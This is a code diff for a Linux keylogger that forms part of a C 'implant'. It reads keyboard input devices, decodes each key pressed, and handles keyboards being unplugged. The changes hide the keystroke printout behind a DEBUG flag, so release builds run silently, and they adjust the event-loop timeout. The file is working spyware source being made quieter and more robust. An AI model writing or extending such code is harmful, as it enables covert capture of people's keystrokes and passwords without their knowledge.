@@ -41,13 +41,23 @@ static int log_keyboard(int fd, struct xkb_state *state) {
         return ERROR;
     }
 
-    // 1 = is_pressed
     if (evt.type == EV_KEY && evt.value == KEY_PRESSED) {
+
+        /*
+            TODO:
+                handle case where user presses on shift to add press a key
+        */
+
         char key_description[256] = {0};
         xkb_keysym_t keysym = xkb_state_key_get_one_sym(state, evt.code + 8);
 
         xkb_keysym_get_name(keysym, key_description, 256);
+
+#ifdef DEBUG
+        /* tracing this in stdout so that errors can be cleanly sent to a file */
         printf("[+] Key pressed: %s\n", key_description);
+#endif
+
     }
 
     return SUCCESSFUL;
@@ -129,7 +139,14 @@ void keylog(implant_t *instance) {
         }
 
         /* check if a key has been pressed */
-        status = select(highest_fd + 1, &rd, NULL, &err, (instance->debug_enabled) ? &(struct timeval){1, 0}: NULL);
+#ifdef DEBUG
+        struct timeval timeout = {0, 1};
+        status = select(highest_fd + 1, &rd, NULL, &err, &timeout);
+#else
+        status = select(highest_fd + 1, &rd, NULL, &err, NULL);
+#endif
+
+
         if (status < 0) {
 
 #ifdef DEBUG
@@ -149,10 +166,17 @@ void keylog(implant_t *instance) {
 #endif
 
                 /* keyboard has been un-plugged, let's continue */
+                FD_CLR(it->fd, &rd);
+                FD_CLR(it->fd, &err);
+
                 close(it->fd);
                 TAILQ_REMOVE(&instance->kbd, it, devices);
 
-                /* TODO: there is probably a memory leak here, investigate how to fix */
+                /*
+                TODO: there is probably a memory leak here, investigate how to fix
+
+                (we allocate keyboard_t instance but we don't free it here... :x )
+                */
 
                 continue;
             }
